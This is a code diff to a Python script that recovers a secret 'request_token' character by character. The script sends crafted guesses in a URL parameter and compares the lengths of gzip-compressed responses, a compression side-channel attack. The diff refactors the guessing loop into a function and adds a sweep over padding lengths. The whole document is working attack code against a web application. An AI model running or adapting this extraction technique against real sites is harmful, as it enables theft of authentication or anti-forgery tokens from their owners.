@@ -13,7 +13,7 @@ param_name = 'request_token'
 # All hexadecimal characters to try as possible token characters
 possible_chars = '0123456789abcdef'
 
-padding = '{}{}{}{}{}'
+padding = '{}'
 
 # Initialize the guessed token as an empty string
 guessed_token = ''
@@ -33,7 +33,7 @@ def get_response_length(guess):
     full_url = f"{url}?{param_name}=%27{guess}"
 
     # Print the full URL
-    print(f"Fetching URL: {full_url}")
+    # print(f"Fetching URL: {full_url}")
 
     headers = {
         'Accept-Encoding': 'gzip, deflate'  # Ensure the response is compressed
@@ -54,30 +54,51 @@ def get_response_length(guess):
         print(f"Request failed: {e}")
         return None
 
-while True:
-    found_char = False
 
-    for c in possible_chars:
-        # Get the response length for the current guess
-        response_lengths = [
-            get_response_length(guessed_token + c + padding + '@'),
-            get_response_length(guessed_token + padding + c + '@')
-        ]
-        if None in response_lengths:
-            continue  # Skip to the next character if the request failed
-        print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")
+def guess_token(url, param_name, possible_chars, padding, padding_amount):
+    guessed_token = ''
+    while True:
+        found_char = False
 
-        # If the response length decreases, we've guessed the correct character
-        if response_lengths[1] > response_lengths[0]:
-            print(f"Found character: '{c}'")
-            guessed_token += c
-            found_char = True
-            break  # Proceed to guess the next character
+        for c in possible_chars:
+            # Get the response length for the current guess
+            response_lengths = [
+                get_response_length(guessed_token + c + padding*padding_amount + '@'),
+                get_response_length(guessed_token + padding*padding_amount + c + '@')
+            ]
+            if None in response_lengths:
+                continue  # Skip to the next character if the request failed
+            print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")
 
-        # time.sleep(0.01)  # Delay to avoid overwhelming the server
+            # If the response length decreases, we've guessed the correct character
+            if response_lengths[1] > response_lengths[0]:
+                print(f"Found character: '{c}'")
+                guessed_token += c
+                found_char = True
+                break  # Proceed to guess the next character
 
-    if not found_char:
-        print("Could not find the next character. Exiting.")
-        break  # Exit if no character causes a decrease in response length
+            # time.sleep(0.01)  # Delay to avoid overwhelming the server
 
-print(f"Guessed token: '{guessed_token}'")
+        if not found_char:
+            print("Could not find the next character. Exiting.")
+            break  # Exit if no character causes a decrease in response length
+
+    print(f"Guessed token: '{guessed_token}'")
+    return guessed_token
+
+
+def main():
+    # test different padding lengths
+    guessed_tokens = {}
+    for padding_amount in range(1,11):
+        guessed_tokens[padding_amount] = guess_token(url, param_name, possible_chars, padding, padding_amount)
+    # sort by number of guessed characters
+    for padding_amount, token in sorted(guessed_tokens.items(), key=lambda x: len(x[1]), reverse=True):
+        print(f"Padding Amount: {padding_amount}, Token Length: {len(token)}, Token: '{token}'")
+
+
+if __name__ == '__main__':
+    main()
+
+
+# TODO increase padding amount only when no character is found.
